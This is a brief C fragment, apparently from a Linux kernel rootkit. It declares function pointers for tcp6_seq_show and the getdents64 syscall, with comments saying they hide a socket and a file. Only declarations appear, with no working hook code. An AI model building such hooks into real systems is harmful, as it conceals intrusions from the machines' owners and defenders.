

/* hides a socket */
int(*tcp6_seq_show)(struct seq_file *file, void *v);

/* hides a file */
asmlinkage int (*org_sys_getdents64)(
        struct pt_regs*
    ); 


